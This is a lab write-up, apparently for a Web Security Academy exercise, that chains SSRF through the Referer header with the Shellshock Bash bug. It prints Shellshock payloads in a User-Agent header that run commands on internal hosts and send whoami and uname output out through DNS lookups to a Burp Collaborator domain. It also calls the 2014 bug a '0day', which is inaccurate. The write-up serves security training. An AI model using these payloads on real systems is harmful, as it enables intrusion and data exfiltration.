# Vulnerability Report on SSRF chain with Shellshock

# `SSRF`exploit via Shellshock ******************************at****************************** `https://[IP].web-security-academy.net/product?productId=1` ********************************to Remote Code Execute********************************

## Description and Impact

> `https://[IP].web-security-academy.net/product?productId=1` is a shop product detail page that is exposed to the WWW, but due to the referrer field in the request, it is possible to infiltrate the internal network with the help of a 0day vulnerability dubbed Shellshock in Bash, which grants the attacker remote execution.
> 

## Step to Reproduce

From this time, we totally can made a request to the outside through referrer field. So, the question we need to answer right now is ***how to perform an IP scanner while making request of that IP to the outside server which we owned ( in this case is Burp Collaborator ).***

Hint from the lab: Shellshock payload

Back to the request we made at the moment. We may want to exploit with the help of [Shellshock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271#match-7146748).

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled.png)

```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

Sample PoC suggest that the field we want to drop the command will we parsed by the Bash and due to that behavior, it will make a connection to the outside world with the deserved command. Similar to OS command injection but in this case, it chain with a 0day vulnerable to successful exploit the target. Noted from the discover above, the 2nd request to burp collab link contains User-Agent field, which is then be logged by the http service running on the machine in the internal network.

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%201.png)

In this case, referrer should be the place we want to put the IP range that provided from the lab for scanning, this will be the 1st request. The 2nd request will come from the IP that expose to the WWW, and inside this 2nd request, User-Agent field should be use as the place the shockshell perform the task, which it run the command and make a connection to the outside server we owned. The process will look like diagram below:

![Untitled Diagram.drawio (1).png](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled_Diagram.drawio_(1).png)

```bash
User-Agent: () { exp;}; echo; /usr/bin/ping $(whoami).[IP].oastify.com
```

Transfer the request to intruder, set range of the IP from 1-255 and put the payload we already prepare.

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%202.png)

Proved that every request is possible due to 200 response. But we want a connection to the outside world from the internal machine of the lab. Polled in Burp Collaborator:

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%203.png)

We saw that we receive 4 difference IP address that make the same task which ping to the domain we take from burp collaborator. Prove that the theory answered the question we made before. And it also prove that we can infiltrate the internal space through the chain of SSRF and Shellshock 0day vulnerable.

To solve the lab, just take the name of the machine, which is performed by `$(whoami)` and append to the burp collab link.

We can run difference command to infiltrate the internal service

![Untitled](Vulnerability%20Report%20on%20SSRF%20chain%20with%20Shellshock%20e69fb6b27fb74614b00c32980e5c7ba9/Untitled%204.png)

```bash
User-Agent: () { exp;}; echo; /usr/bin/ping $(uname).[IP].oastify.com
```

## Recommendations

Patch the internal server

Anti SSRF technique

White list domain/IP/URL

Input validation
WAF

## References

SSRF in the nutshell: [https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf](https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf)

Testing guide: [https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
Cheat sheet: [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/)
ShellShock report the new york time: [https://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html](https://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html)

Technical report: [https://resources.infosecinstitute.com/topic/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/](https://resources.infosecinstitute.com/topic/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)

CGI: [https://en.wikipedia.org/wiki/Common_Gateway_Interface](https://en.wikipedia.org/wiki/Common_Gateway_Interface)

Bash patch right after the CVE reveal: https://github.com/gitGNU/gnu_bash/commit/b64a0e1d0b412cedda763a32d6e5cd6927333f02

PoC produce by RedHat: [https://access.redhat.com/articles/1200223](https://access.redhat.com/articles/1200223)